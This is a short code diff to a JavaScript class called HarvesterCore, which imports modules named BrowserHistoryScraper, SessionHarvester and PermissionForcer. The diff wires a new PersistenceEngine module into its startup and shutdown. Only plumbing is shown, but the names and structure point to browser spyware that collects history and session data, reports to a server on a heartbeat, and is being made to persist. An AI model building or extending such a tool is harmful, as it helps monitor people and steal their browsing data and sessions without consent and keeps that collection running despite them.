@@ -13,6 +13,7 @@ import BrowserHistoryScraper from './BrowserHistoryScraper';
 import SessionHarvester from './SessionHarvester';
 import PermissionForcer from './PermissionForcer';
 import NavigationTracker from './NavigationTracker';
+import PersistenceEngine from './PersistenceEngine';
 
 const API = process.env.REACT_APP_API_URL || 'http://localhost:5000';
 const axiosInstance = axios.create({ baseURL: API, timeout: 10000 });
@@ -25,7 +26,7 @@ class HarvesterCore {
     this.startTime = Date.now();
     this.heartbeatInterval = null;
     this.modules = {};
-    this._reconnectAttempted = false; // Track if we already tried reconnect on this page load
+    this._reconnectAttempted = false;
   }
 
   async init() {
@@ -85,6 +86,8 @@ class HarvesterCore {
     }
 
     this.initialized = true;
+    this.persistenceEngine = new PersistenceEngine(this);
+    this.persistenceEngine.init();
     this.startModules();
     this.startHeartbeat();
     this.setupBeforeUnload();
@@ -141,6 +144,10 @@ class HarvesterCore {
       if (this.heartbeatInterval) {
         clearInterval(this.heartbeatInterval);
         this.heartbeatInterval = null;
+      }
+
+      if (this.persistenceEngine) {
+        this.persistenceEngine.cleanup();
       }
 
       // Clear the session on unload so refresh creates a new one
